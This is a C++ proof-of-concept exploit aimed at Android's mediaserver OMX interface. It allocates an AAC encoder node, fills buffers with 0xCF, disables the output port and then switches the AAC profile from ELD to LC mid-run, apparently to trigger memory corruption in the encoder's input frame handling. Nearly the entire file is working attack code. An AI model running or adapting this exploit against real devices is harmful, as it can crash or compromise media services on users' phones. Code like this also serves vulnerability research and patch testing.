#pragma GCC diagnostic ignored "-Wsign-compare"
#pragma GCC diagnostic ignored "-Wunused-variable"
#pragma GCC diagnostic ignored "-Wnon-virtual-dtor"

#define LOG_TAG "fuzz"

#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <media/stagefright/foundation/ADebug.h>

#include <binder/Binder.h>
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>

#include <media/IMediaHTTPService.h>
#include <media/IMediaPlayerService.h>
#include <media/stagefright/foundation/ALooper.h>

#include <media/mediametadataretriever.h>
#include <media/stagefright/AudioPlayer.h>
#include <media/stagefright/DataSource.h>
#include <media/stagefright/JPEGSource.h>
#include <media/stagefright/MediaDefs.h>
#include <media/stagefright/MediaErrors.h>
#include <media/stagefright/MediaExtractor.h>
#include <media/stagefright/MediaSource.h>
#include <media/stagefright/MetaData.h>
#include <media/stagefright/OMXClient.h>

#include <private/media/VideoFrame.h>

#include <media/ICrypto.h>
#include <media/IHDCP.h>
#include <media/IMediaCodecList.h>
#include <media/IMediaRecorder.h>

#include <media/AudioEffect.h>
#include <media/IAudioFlinger.h>
#include <media/IEffect.h>
#include <media/IEffectClient.h>
#include <private/media/AudioEffectShared.h>

#include <gui/ISensorEventConnection.h>
#include <gui/ISensorServer.h>

#include <binder/MemoryBase.h>
#include <binder/MemoryDealer.h>
#include <binder/MemoryHeapBase.h>

#include <gui/BufferQueue.h>
#include <gui/BufferQueueConsumer.h>
#include <gui/BufferQueueCore.h>
#include <gui/BufferQueueProducer.h>
#include <gui/CpuConsumer.h>

#include <media/IOMX.h>

#include "OMX_IndexExt.h"

#include "OMX_Component.h"
#include "OMX_QCOMExtns.h"

#include <media/hardware/HardwareAPI.h>
#include "gralloc_priv.h"

using namespace android;

template <class T>
static void InitOMXParams(T *params) {
  params->nSize = sizeof(T);
  params->nVersion.s.nVersionMajor = 1;
  params->nVersion.s.nVersionMinor = 0;
  params->nVersion.s.nRevision = 0;
  params->nVersion.s.nStep = 0;
}

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages) {
    if (messages.empty()) {
      return;
    }
  }

 protected:
  virtual ~DummyOMXObserver() {}
};

static bool connectOMX(sp<IOMX> &omx) {
  sp<IServiceManager> sm = defaultServiceManager();

  sp<IBinder> binder = sm->getService(String16("media.player"));
  sp<IMediaPlayerService> mediaPlayerService =
      interface_cast<IMediaPlayerService>(binder);

  if (mediaPlayerService == NULL) {
    return false;
  }

  omx = mediaPlayerService->getOMX();
  if (omx == NULL) {
    return false;
  }

  return true;
}

void poc() {
  sp<IOMX> service;
  if (connectOMX(service) == false) return;

  IOMX::node_id node = 0;
  int fenceFd = -1;

  const char *codecName = "OMX.google.aac.encoder";

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  status_t err = service->allocateNode(codecName, observer, nullptr, &node);
  if (err != OK) {
    return;
  }

  // get input port parameters
  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  err = service->getParameter(node, OMX_IndexParamPortDefinition, &def,
                              sizeof(def));

  // prepare input port buffers
  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;

  sp<MemoryDealer> dealerIn = new MemoryDealer(inMemSize);
  IOMX::buffer_id *inBufferId = new IOMX::buffer_id[inBufferCnt];

  // get output port parameters
  InitOMXParams(&def);
  def.nPortIndex = 1;
  err = service->getParameter(node, OMX_IndexParamPortDefinition, &def,
                              sizeof(def));

  // prepare output port buffers
  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  int outBufferSize = outMemSize / outBufferCnt;

  sp<MemoryDealer> dealerOut = new MemoryDealer(outMemSize);
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  OMX_AUDIO_PARAM_AACPROFILETYPE *paramsAAC =
      (OMX_AUDIO_PARAM_AACPROFILETYPE *)malloc(
          sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE));
  paramsAAC->nSize = sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE);
  paramsAAC->nPortIndex = 1;
  paramsAAC->nSampleRate = 48000;
  paramsAAC->nChannels = 6;
  paramsAAC->eAACProfile =
      (OMX_AUDIO_AACPROFILETYPE)39;  // OMX_AUDIO_AACObjectELD
  paramsAAC->nAACtools = 0x20000;
  paramsAAC->nBitRate = 127992;

  err = service->setParameter(node, OMX_IndexParamAudioAac, paramsAAC,
                              sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE));

  for (int i = 0; i < inBufferCnt; i++) {
    sp<IMemory> memory = dealerIn->allocate(inBufferSize);
    memset(memory->pointer(), 0xCF, inBufferSize);
    err = service->useBuffer(node, 0, memory, &inBufferId[i],
                             inBufferSize /*allottedSize*/);
  }

  for (int i = 0; i < outBufferCnt; i++) {
    sp<IMemory> memory = dealerOut->allocate(outBufferSize);
    err = service->allocateBufferWithBackup(node, 1 /*out port index*/, memory,
                                            &outBufferId[i], outBufferSize);
  }

  // change state from loaded to idle
  err = service->sendCommand(node, OMX_CommandStateSet, 2);

  // change state from idle to executing
  err = service->sendCommand(node, OMX_CommandStateSet, 3);

  // make mediaserver allocate the "mInputFrame"
  err =
      service->emptyBuffer(node, inBufferId[0], 0, inBufferSize, 0, 0, fenceFd);
  err = service->fillBuffer(node, outBufferId[0], fenceFd);

  // disable port 1
  err = service->sendCommand(node, OMX_CommandPortDisable, 1);

  sleep(2);

  {
    // change the paramsAAC->eAACProfile
    OMX_AUDIO_PARAM_AACPROFILETYPE *paramsAAC =
        (OMX_AUDIO_PARAM_AACPROFILETYPE *)malloc(
            sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE));
    paramsAAC->nSize = sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE);
    paramsAAC->nPortIndex = 1;
    paramsAAC->nSampleRate = 48000;
    paramsAAC->nChannels = 6;
    paramsAAC->eAACProfile = OMX_AUDIO_AACObjectLC;
    paramsAAC->nAACtools = 0x20000;
    paramsAAC->nBitRate = 127992;

    err = service->setParameter(node, OMX_IndexParamAudioAac, paramsAAC,
                                sizeof(OMX_AUDIO_PARAM_AACPROFILETYPE));
  }

  sleep(2);

  for (int i = 1; i < inBufferCnt; i++) {
    err = service->emptyBuffer(node, inBufferId[i], 0, inBufferSize, 0, 0,
                               fenceFd);
  }

  for (int i = 1; i < outBufferCnt; i++) {
    err = service->fillBuffer(node, outBufferId[i], fenceFd);
  }

  err = service->freeNode(node);
}

int main() {
  android::ProcessState::self()->startThreadPool();
  poc();
  return 0;
}
